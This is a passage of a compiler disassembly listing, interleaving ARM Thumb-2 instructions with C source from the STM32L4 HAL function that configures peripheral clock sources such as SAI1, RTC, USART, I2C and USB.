 800453a:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 800453c:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 8004540:	d01a      	beq.n	8004578 <HAL_RCCEx_PeriphCLKConfig+0x5c>
 8004542:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 8004546:	d814      	bhi.n	8004572 <HAL_RCCEx_PeriphCLKConfig+0x56>
 8004548:	2b00      	cmp	r3, #0
 800454a:	d009      	beq.n	8004560 <HAL_RCCEx_PeriphCLKConfig+0x44>
 800454c:	f5b3 0f00 	cmp.w	r3, #8388608	; 0x800000
 8004550:	d10f      	bne.n	8004572 <HAL_RCCEx_PeriphCLKConfig+0x56>
    case RCC_SAI1CLKSOURCE_PLL:      /* PLL is used as clock source for SAI1*/
      /* Enable SAI Clock output generated from System PLL . */
#if defined(RCC_PLLSAI2_SUPPORT)
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI3CLK);
#else
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI2CLK);
 8004552:	4b5d      	ldr	r3, [pc, #372]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004554:	68db      	ldr	r3, [r3, #12]
 8004556:	4a5c      	ldr	r2, [pc, #368]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004558:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 800455c:	60d3      	str	r3, [r2, #12]
#endif /* RCC_PLLSAI2_SUPPORT */
      /* SAI1 clock source config set later after clock selection check */
      break;
 800455e:	e00c      	b.n	800457a <HAL_RCCEx_PeriphCLKConfig+0x5e>

    case RCC_SAI1CLKSOURCE_PLLSAI1:  /* PLLSAI1 is used as clock source for SAI1*/
      /* PLLSAI1 input clock, parameters M, N & P configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_P_UPDATE);
 8004560:	687b      	ldr	r3, [r7, #4]
 8004562:	3304      	adds	r3, #4
 8004564:	2100      	movs	r1, #0
 8004566:	4618      	mov	r0, r3
 8004568:	f000 f9de 	bl	8004928 <RCCEx_PLLSAI1_Config>
 800456c:	4603      	mov	r3, r0
 800456e:	74fb      	strb	r3, [r7, #19]
      /* SAI1 clock source config set later after clock selection check */
      break;
 8004570:	e003      	b.n	800457a <HAL_RCCEx_PeriphCLKConfig+0x5e>
#endif /* STM32L4P5xx || STM32L4Q5xx || STM32L4R5xx || STM32L4R7xx || STM32L4R9xx || STM32L4S5xx || STM32L4S7xx || STM32L4S9xx */
      /* SAI1 clock source config set later after clock selection check */
      break;

    default:
      ret = HAL_ERROR;
 8004572:	2301      	movs	r3, #1
 8004574:	74fb      	strb	r3, [r7, #19]
      break;
 8004576:	e000      	b.n	800457a <HAL_RCCEx_PeriphCLKConfig+0x5e>
      break;
 8004578:	bf00      	nop
    }

    if(ret == HAL_OK)
 800457a:	7cfb      	ldrb	r3, [r7, #19]
 800457c:	2b00      	cmp	r3, #0
 800457e:	d10b      	bne.n	8004598 <HAL_RCCEx_PeriphCLKConfig+0x7c>
    {
      /* Set the source of SAI1 clock*/
      __HAL_RCC_SAI1_CONFIG(PeriphClkInit->Sai1ClockSelection);
 8004580:	4b51      	ldr	r3, [pc, #324]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004582:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004586:	f423 0240 	bic.w	r2, r3, #12582912	; 0xc00000
 800458a:	687b      	ldr	r3, [r7, #4]
 800458c:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 800458e:	494e      	ldr	r1, [pc, #312]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004590:	4313      	orrs	r3, r2
 8004592:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
 8004596:	e001      	b.n	800459c <HAL_RCCEx_PeriphCLKConfig+0x80>
    }
    else
    {
      /* set overall return value */
      status = ret;
 8004598:	7cfb      	ldrb	r3, [r7, #19]
 800459a:	74bb      	strb	r3, [r7, #18]
    }
  }
#endif /* SAI2 */

  /*-------------------------- RTC clock source configuration ----------------------*/
  if((PeriphClkInit->PeriphClockSelection & RCC_PERIPHCLK_RTC) == RCC_PERIPHCLK_RTC)
 800459c:	687b      	ldr	r3, [r7, #4]
 800459e:	681b      	ldr	r3, [r3, #0]
 80045a0:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 80045a4:	2b00      	cmp	r3, #0
 80045a6:	f000 809e 	beq.w	80046e6 <HAL_RCCEx_PeriphCLKConfig+0x1ca>
  {
    FlagStatus       pwrclkchanged = RESET;
 80045aa:	2300      	movs	r3, #0
 80045ac:	747b      	strb	r3, [r7, #17]

    /* Check for RTC Parameters used to output RTCCLK */
    assert_param(IS_RCC_RTCCLKSOURCE(PeriphClkInit->RTCClockSelection));

    /* Enable Power Clock */
    if(__HAL_RCC_PWR_IS_CLK_DISABLED() != 0U)
 80045ae:	4b46      	ldr	r3, [pc, #280]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045b0:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80045b2:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 80045b6:	2b00      	cmp	r3, #0
 80045b8:	d101      	bne.n	80045be <HAL_RCCEx_PeriphCLKConfig+0xa2>
 80045ba:	2301      	movs	r3, #1
 80045bc:	e000      	b.n	80045c0 <HAL_RCCEx_PeriphCLKConfig+0xa4>
 80045be:	2300      	movs	r3, #0
 80045c0:	2b00      	cmp	r3, #0
 80045c2:	d00d      	beq.n	80045e0 <HAL_RCCEx_PeriphCLKConfig+0xc4>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 80045c4:	4b40      	ldr	r3, [pc, #256]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045c6:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80045c8:	4a3f      	ldr	r2, [pc, #252]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045ca:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 80045ce:	6593      	str	r3, [r2, #88]	; 0x58
 80045d0:	4b3d      	ldr	r3, [pc, #244]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045d2:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80045d4:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 80045d8:	60bb      	str	r3, [r7, #8]
 80045da:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 80045dc:	2301      	movs	r3, #1
 80045de:	747b      	strb	r3, [r7, #17]
    }

    /* Enable write access to Backup domain */
    SET_BIT(PWR->CR1, PWR_CR1_DBP);
 80045e0:	4b3a      	ldr	r3, [pc, #232]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 80045e2:	681b      	ldr	r3, [r3, #0]
 80045e4:	4a39      	ldr	r2, [pc, #228]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 80045e6:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 80045ea:	6013      	str	r3, [r2, #0]

    /* Wait for Backup domain Write protection disable */
    tickstart = HAL_GetTick();
 80045ec:	f7fc fdda 	bl	80011a4 <HAL_GetTick>
 80045f0:	60f8      	str	r0, [r7, #12]

    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 80045f2:	e009      	b.n	8004608 <HAL_RCCEx_PeriphCLKConfig+0xec>
    {
      if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 80045f4:	f7fc fdd6 	bl	80011a4 <HAL_GetTick>
 80045f8:	4602      	mov	r2, r0
 80045fa:	68fb      	ldr	r3, [r7, #12]
 80045fc:	1ad3      	subs	r3, r2, r3
 80045fe:	2b02      	cmp	r3, #2
 8004600:	d902      	bls.n	8004608 <HAL_RCCEx_PeriphCLKConfig+0xec>
      {
        ret = HAL_TIMEOUT;
 8004602:	2303      	movs	r3, #3
 8004604:	74fb      	strb	r3, [r7, #19]
        break;
 8004606:	e005      	b.n	8004614 <HAL_RCCEx_PeriphCLKConfig+0xf8>
    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 8004608:	4b30      	ldr	r3, [pc, #192]	; (80046cc <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 800460a:	681b      	ldr	r3, [r3, #0]
 800460c:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8004610:	2b00      	cmp	r3, #0
 8004612:	d0ef      	beq.n	80045f4 <HAL_RCCEx_PeriphCLKConfig+0xd8>
      }
    }

    if(ret == HAL_OK)
 8004614:	7cfb      	ldrb	r3, [r7, #19]
 8004616:	2b00      	cmp	r3, #0
 8004618:	d15a      	bne.n	80046d0 <HAL_RCCEx_PeriphCLKConfig+0x1b4>
    {
      /* Reset the Backup domain only if the RTC Clock source selection is modified from default */
      tmpregister = READ_BIT(RCC->BDCR, RCC_BDCR_RTCSEL);
 800461a:	4b2b      	ldr	r3, [pc, #172]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800461c:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004620:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004624:	617b      	str	r3, [r7, #20]

      if((tmpregister != RCC_RTCCLKSOURCE_NONE) && (tmpregister != PeriphClkInit->RTCClockSelection))
 8004626:	697b      	ldr	r3, [r7, #20]
 8004628:	2b00      	cmp	r3, #0
 800462a:	d01e      	beq.n	800466a <HAL_RCCEx_PeriphCLKConfig+0x14e>
 800462c:	687b      	ldr	r3, [r7, #4]
 800462e:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 8004630:	697a      	ldr	r2, [r7, #20]
 8004632:	429a      	cmp	r2, r3
 8004634:	d019      	beq.n	800466a <HAL_RCCEx_PeriphCLKConfig+0x14e>
      {
        /* Store the content of BDCR register before the reset of Backup Domain */
        tmpregister = READ_BIT(RCC->BDCR, ~(RCC_BDCR_RTCSEL));
 8004636:	4b24      	ldr	r3, [pc, #144]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004638:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800463c:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 8004640:	617b      	str	r3, [r7, #20]
        /* RTC Clock selection can be changed only if the Backup Domain is reset */
        __HAL_RCC_BACKUPRESET_FORCE();
 8004642:	4b21      	ldr	r3, [pc, #132]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004644:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004648:	4a1f      	ldr	r2, [pc, #124]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800464a:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 800464e:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        __HAL_RCC_BACKUPRESET_RELEASE();
 8004652:	4b1d      	ldr	r3, [pc, #116]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004654:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004658:	4a1b      	ldr	r2, [pc, #108]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800465a:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 800465e:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        /* Restore the Content of BDCR register */
        RCC->BDCR = tmpregister;
 8004662:	4a19      	ldr	r2, [pc, #100]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004664:	697b      	ldr	r3, [r7, #20]
 8004666:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
      }

      /* Wait for LSE reactivation if LSE was enable prior to Backup Domain reset */
      if (HAL_IS_BIT_SET(tmpregister, RCC_BDCR_LSEON))
 800466a:	697b      	ldr	r3, [r7, #20]
 800466c:	f003 0301 	and.w	r3, r3, #1
 8004670:	2b00      	cmp	r3, #0
 8004672:	d016      	beq.n	80046a2 <HAL_RCCEx_PeriphCLKConfig+0x186>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8004674:	f7fc fd96 	bl	80011a4 <HAL_GetTick>
 8004678:	60f8      	str	r0, [r7, #12]

        /* Wait till LSE is ready */
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 800467a:	e00b      	b.n	8004694 <HAL_RCCEx_PeriphCLKConfig+0x178>
        {
          if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 800467c:	f7fc fd92 	bl	80011a4 <HAL_GetTick>
 8004680:	4602      	mov	r2, r0
 8004682:	68fb      	ldr	r3, [r7, #12]
 8004684:	1ad3      	subs	r3, r2, r3
 8004686:	f241 3288 	movw	r2, #5000	; 0x1388
 800468a:	4293      	cmp	r3, r2
 800468c:	d902      	bls.n	8004694 <HAL_RCCEx_PeriphCLKConfig+0x178>
          {
            ret = HAL_TIMEOUT;
 800468e:	2303      	movs	r3, #3
 8004690:	74fb      	strb	r3, [r7, #19]
            break;
 8004692:	e006      	b.n	80046a2 <HAL_RCCEx_PeriphCLKConfig+0x186>
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8004694:	4b0c      	ldr	r3, [pc, #48]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004696:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800469a:	f003 0302 	and.w	r3, r3, #2
 800469e:	2b00      	cmp	r3, #0
 80046a0:	d0ec      	beq.n	800467c <HAL_RCCEx_PeriphCLKConfig+0x160>
          }
        }
      }

      if(ret == HAL_OK)
 80046a2:	7cfb      	ldrb	r3, [r7, #19]
 80046a4:	2b00      	cmp	r3, #0
 80046a6:	d10b      	bne.n	80046c0 <HAL_RCCEx_PeriphCLKConfig+0x1a4>
      {
        /* Apply new RTC clock source selection */
        __HAL_RCC_RTC_CONFIG(PeriphClkInit->RTCClockSelection);
 80046a8:	4b07      	ldr	r3, [pc, #28]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80046aa:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80046ae:	f423 7240 	bic.w	r2, r3, #768	; 0x300
 80046b2:	687b      	ldr	r3, [r7, #4]
 80046b4:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 80046b6:	4904      	ldr	r1, [pc, #16]	; (80046c8 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80046b8:	4313      	orrs	r3, r2
 80046ba:	f8c1 3090 	str.w	r3, [r1, #144]	; 0x90
 80046be:	e009      	b.n	80046d4 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
      }
      else
      {
        /* set overall return value */
        status = ret;
 80046c0:	7cfb      	ldrb	r3, [r7, #19]
 80046c2:	74bb      	strb	r3, [r7, #18]
 80046c4:	e006      	b.n	80046d4 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
 80046c6:	bf00      	nop
 80046c8:	40021000 	.word	0x40021000
 80046cc:	40007000 	.word	0x40007000
      }
    }
    else
    {
      /* set overall return value */
      status = ret;
 80046d0:	7cfb      	ldrb	r3, [r7, #19]
 80046d2:	74bb      	strb	r3, [r7, #18]
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 80046d4:	7c7b      	ldrb	r3, [r7, #17]
 80046d6:	2b01      	cmp	r3, #1
 80046d8:	d105      	bne.n	80046e6 <HAL_RCCEx_PeriphCLKConfig+0x1ca>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 80046da:	4b8a      	ldr	r3, [pc, #552]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046dc:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80046de:	4a89      	ldr	r2, [pc, #548]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046e0:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 80046e4:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }

  /*-------------------------- USART1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART1) == RCC_PERIPHCLK_USART1)
 80046e6:	687b      	ldr	r3, [r7, #4]
 80046e8:	681b      	ldr	r3, [r3, #0]
 80046ea:	f003 0301 	and.w	r3, r3, #1
 80046ee:	2b00      	cmp	r3, #0
 80046f0:	d00a      	beq.n	8004708 <HAL_RCCEx_PeriphCLKConfig+0x1ec>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART1CLKSOURCE(PeriphClkInit->Usart1ClockSelection));

    /* Configure the USART1 clock source */
    __HAL_RCC_USART1_CONFIG(PeriphClkInit->Usart1ClockSelection);
 80046f2:	4b84      	ldr	r3, [pc, #528]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046f4:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80046f8:	f023 0203 	bic.w	r2, r3, #3
 80046fc:	687b      	ldr	r3, [r7, #4]
 80046fe:	6a1b      	ldr	r3, [r3, #32]
 8004700:	4980      	ldr	r1, [pc, #512]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004702:	4313      	orrs	r3, r2
 8004704:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- USART2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART2) == RCC_PERIPHCLK_USART2)
 8004708:	687b      	ldr	r3, [r7, #4]
 800470a:	681b      	ldr	r3, [r3, #0]
 800470c:	f003 0302 	and.w	r3, r3, #2
 8004710:	2b00      	cmp	r3, #0
 8004712:	d00a      	beq.n	800472a <HAL_RCCEx_PeriphCLKConfig+0x20e>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART2CLKSOURCE(PeriphClkInit->Usart2ClockSelection));

    /* Configure the USART2 clock source */
    __HAL_RCC_USART2_CONFIG(PeriphClkInit->Usart2ClockSelection);
 8004714:	4b7b      	ldr	r3, [pc, #492]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004716:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800471a:	f023 020c 	bic.w	r2, r3, #12
 800471e:	687b      	ldr	r3, [r7, #4]
 8004720:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004722:	4978      	ldr	r1, [pc, #480]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004724:	4313      	orrs	r3, r2
 8004726:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* UART5 */

  /*-------------------------- LPUART1 clock source configuration ------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPUART1) == RCC_PERIPHCLK_LPUART1)
 800472a:	687b      	ldr	r3, [r7, #4]
 800472c:	681b      	ldr	r3, [r3, #0]
 800472e:	f003 0320 	and.w	r3, r3, #32
 8004732:	2b00      	cmp	r3, #0
 8004734:	d00a      	beq.n	800474c <HAL_RCCEx_PeriphCLKConfig+0x230>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LPUART1CLKSOURCE(PeriphClkInit->Lpuart1ClockSelection));

    /* Configure the LPUART1 clock source */
    __HAL_RCC_LPUART1_CONFIG(PeriphClkInit->Lpuart1ClockSelection);
 8004736:	4b73      	ldr	r3, [pc, #460]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004738:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800473c:	f423 6240 	bic.w	r2, r3, #3072	; 0xc00
 8004740:	687b      	ldr	r3, [r7, #4]
 8004742:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004744:	496f      	ldr	r1, [pc, #444]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004746:	4313      	orrs	r3, r2
 8004748:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM1) == (RCC_PERIPHCLK_LPTIM1))
 800474c:	687b      	ldr	r3, [r7, #4]
 800474e:	681b      	ldr	r3, [r3, #0]
 8004750:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8004754:	2b00      	cmp	r3, #0
 8004756:	d00a      	beq.n	800476e <HAL_RCCEx_PeriphCLKConfig+0x252>
  {
    assert_param(IS_RCC_LPTIM1CLK(PeriphClkInit->Lptim1ClockSelection));
    __HAL_RCC_LPTIM1_CONFIG(PeriphClkInit->Lptim1ClockSelection);
 8004758:	4b6a      	ldr	r3, [pc, #424]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800475a:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800475e:	f423 2240 	bic.w	r2, r3, #786432	; 0xc0000
 8004762:	687b      	ldr	r3, [r7, #4]
 8004764:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8004766:	4967      	ldr	r1, [pc, #412]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004768:	4313      	orrs	r3, r2
 800476a:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM2) == (RCC_PERIPHCLK_LPTIM2))
 800476e:	687b      	ldr	r3, [r7, #4]
 8004770:	681b      	ldr	r3, [r3, #0]
 8004772:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8004776:	2b00      	cmp	r3, #0
 8004778:	d00a      	beq.n	8004790 <HAL_RCCEx_PeriphCLKConfig+0x274>
  {
    assert_param(IS_RCC_LPTIM2CLK(PeriphClkInit->Lptim2ClockSelection));
    __HAL_RCC_LPTIM2_CONFIG(PeriphClkInit->Lptim2ClockSelection);
 800477a:	4b62      	ldr	r3, [pc, #392]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800477c:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004780:	f423 1240 	bic.w	r2, r3, #3145728	; 0x300000
 8004784:	687b      	ldr	r3, [r7, #4]
 8004786:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8004788:	495e      	ldr	r1, [pc, #376]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800478a:	4313      	orrs	r3, r2
 800478c:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- I2C1 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C1) == RCC_PERIPHCLK_I2C1)
 8004790:	687b      	ldr	r3, [r7, #4]
 8004792:	681b      	ldr	r3, [r3, #0]
 8004794:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004798:	2b00      	cmp	r3, #0
 800479a:	d00a      	beq.n	80047b2 <HAL_RCCEx_PeriphCLKConfig+0x296>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C1CLKSOURCE(PeriphClkInit->I2c1ClockSelection));

    /* Configure the I2C1 clock source */
    __HAL_RCC_I2C1_CONFIG(PeriphClkInit->I2c1ClockSelection);
 800479c:	4b59      	ldr	r3, [pc, #356]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800479e:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80047a2:	f423 5240 	bic.w	r2, r3, #12288	; 0x3000
 80047a6:	687b      	ldr	r3, [r7, #4]
 80047a8:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 80047aa:	4956      	ldr	r1, [pc, #344]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047ac:	4313      	orrs	r3, r2
 80047ae:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* I2C2 */

  /*-------------------------- I2C3 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C3) == RCC_PERIPHCLK_I2C3)
 80047b2:	687b      	ldr	r3, [r7, #4]
 80047b4:	681b      	ldr	r3, [r3, #0]
 80047b6:	f403 7380 	and.w	r3, r3, #256	; 0x100
 80047ba:	2b00      	cmp	r3, #0
 80047bc:	d00a      	beq.n	80047d4 <HAL_RCCEx_PeriphCLKConfig+0x2b8>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C3CLKSOURCE(PeriphClkInit->I2c3ClockSelection));

    /* Configure the I2C3 clock source */
    __HAL_RCC_I2C3_CONFIG(PeriphClkInit->I2c3ClockSelection);
 80047be:	4b51      	ldr	r3, [pc, #324]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047c0:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80047c4:	f423 3240 	bic.w	r2, r3, #196608	; 0x30000
 80047c8:	687b      	ldr	r3, [r7, #4]
 80047ca:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 80047cc:	494d      	ldr	r1, [pc, #308]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047ce:	4313      	orrs	r3, r2
 80047d0:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
#endif /* I2C4 */

#if defined(USB_OTG_FS) || defined(USB)

  /*-------------------------- USB clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USB) == (RCC_PERIPHCLK_USB))
 80047d4:	687b      	ldr	r3, [r7, #4]
 80047d6:	681b      	ldr	r3, [r3, #0]
 80047d8:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 80047dc:	2b00      	cmp	r3, #0
 80047de:	d028      	beq.n	8004832 <HAL_RCCEx_PeriphCLKConfig+0x316>
  {
    assert_param(IS_RCC_USBCLKSOURCE(PeriphClkInit->UsbClockSelection));
    __HAL_RCC_USB_CONFIG(PeriphClkInit->UsbClockSelection);
 80047e0:	4b48      	ldr	r3, [pc, #288]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047e2:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80047e6:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 80047ea:	687b      	ldr	r3, [r7, #4]
 80047ec:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80047ee:	4945      	ldr	r1, [pc, #276]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047f0:	4313      	orrs	r3, r2
 80047f2:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLL)
 80047f6:	687b      	ldr	r3, [r7, #4]
 80047f8:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80047fa:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 80047fe:	d106      	bne.n	800480e <HAL_RCCEx_PeriphCLKConfig+0x2f2>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 8004800:	4b40      	ldr	r3, [pc, #256]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004802:	68db      	ldr	r3, [r3, #12]
 8004804:	4a3f      	ldr	r2, [pc, #252]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004806:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 800480a:	60d3      	str	r3, [r2, #12]
 800480c:	e011      	b.n	8004832 <HAL_RCCEx_PeriphCLKConfig+0x316>
    }
    else
    {
#if defined(RCC_PLLSAI1_SUPPORT)
      if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLLSAI1)
 800480e:	687b      	ldr	r3, [r7, #4]
 8004810:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8004812:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 8004816:	d10c      	bne.n	8004832 <HAL_RCCEx_PeriphCLKConfig+0x316>
      {
        /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
        ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 8004818:	687b      	ldr	r3, [r7, #4]
 800481a:	3304      	adds	r3, #4
 800481c:	2101      	movs	r1, #1
 800481e:	4618      	mov	r0, r3
 8004820:	f000 f882 	bl	8004928 <RCCEx_PLLSAI1_Config>
 8004824:	4603      	mov	r3, r0
 8004826:	74fb      	strb	r3, [r7, #19]

        if(ret != HAL_OK)
 8004828:	7cfb      	ldrb	r3, [r7, #19]
 800482a:	2b00      	cmp	r3, #0
 800482c:	d001      	beq.n	8004832 <HAL_RCCEx_PeriphCLKConfig+0x316>
        {
          /* set overall return value */
          status = ret;
 800482e:	7cfb      	ldrb	r3, [r7, #19]
 8004830:	74bb      	strb	r3, [r7, #18]
  }

#endif /* SDMMC1 */

  /*-------------------------- RNG clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_RNG) == (RCC_PERIPHCLK_RNG))
 8004832:	687b      	ldr	r3, [r7, #4]
 8004834:	681b      	ldr	r3, [r3, #0]
 8004836:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 800483a:	2b00      	cmp	r3, #0
 800483c:	d028      	beq.n	8004890 <HAL_RCCEx_PeriphCLKConfig+0x374>
  {
